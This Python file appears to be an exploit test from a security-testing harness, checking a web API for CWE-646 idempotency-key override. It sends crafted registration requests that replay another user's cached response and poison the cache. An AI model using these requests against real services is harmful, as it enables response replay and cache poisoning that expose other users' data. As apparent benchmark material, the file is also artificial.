"""PoC: Idempotency key override via X-Idempotency-Key header (CWE-646).

After stage 3, a client can provide an arbitrary idempotency key via
the X-Idempotency-Key header. An attacker who knows (or guesses) another
user's idempotency key can replay their cached response.
"""

from mosaic.oracle.exploit import ExploitTest


class ExpressIdempotencyOverrideExploit(ExploitTest):
    """Idempotency override: replay cached responses via client-controlled key."""

    @property
    def chain_id(self) -> str:
        return "express_idempotency_override"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Step 1: Make a legitimate request with a known idempotency key
        legit_key = "legit-user-key-001"
        resp1 = self.http_post(
            "/v1/auth/register",
            json={
                "name": "Legit User",
                "email": "legit_idemp@test.com",
                "password": "password123",
            },
            headers={"X-Idempotency-Key": legit_key},
        )
        evidence.append(f"First request: HTTP {resp1.status_code}")

        if not resp1.ok:
            # Try a simpler endpoint
            resp1 = self.http_post(
                "/v1/auth/login",
                json={"email": "test@test.com", "password": "test123"},
                headers={"X-Idempotency-Key": legit_key},
            )
            evidence.append(f"Login attempt: HTTP {resp1.status_code}")

        # Step 2: Replay with the same key but different payload
        resp2 = self.http_post(
            "/v1/auth/register",
            json={
                "name": "Attacker",
                "email": "attacker@evil.com",
                "password": "evil",
            },
            headers={"X-Idempotency-Key": legit_key},
        )
        evidence.append(f"Replay request: HTTP {resp2.status_code}")

        replay_matched = False
        if resp1.ok and resp2.ok:
            try:
                body1 = resp1.text
                body2 = resp2.text
                if body1 == body2:
                    replay_matched = True
                    evidence.append(
                        "REPLAY: same response body for different payloads "
                        "using the same X-Idempotency-Key"
                    )
            except Exception:
                pass

        # Step 3: Check idempotency-keys endpoint
        keys_resp = self.http_get("/v1/idempotency-keys")
        if keys_resp.ok:
            try:
                keys_data = keys_resp.json()
                if legit_key in keys_data.get("keys", []):
                    evidence.append(
                        f"Key '{legit_key}' found in cache "
                        f"({keys_data.get('count', 0)} total keys)"
                    )
            except Exception:
                pass

        # Step 4: Cache poisoning — attacker creates their own entry
        attacker_key = "attacker-poison-key"
        poison1 = self.http_post(
            "/v1/auth/register",
            json={"name": "Poison", "email": "p@test.com", "password": "x"},
            headers={"X-Idempotency-Key": attacker_key},
        )
        poison2 = self.http_post(
            "/v1/auth/register",
            json={"name": "Different", "email": "d@test.com", "password": "y"},
            headers={"X-Idempotency-Key": attacker_key},
        )
        cache_poisoned = False
        if poison1.ok and poison2.ok and poison1.text == poison2.text:
            cache_poisoned = True
            evidence.append("Cache poisoning confirmed: attacker-controlled key returns cached response")

        if replay_matched or cache_poisoned:
            return True, (
                f"CWE-646 confirmed. X-Idempotency-Key allows client-controlled "
                f"cache keys, enabling replay of cached responses. "
                + " | ".join(evidence)
            )

        return False, (
            f"Idempotency override not confirmed. "
            + " | ".join(evidence)
        )
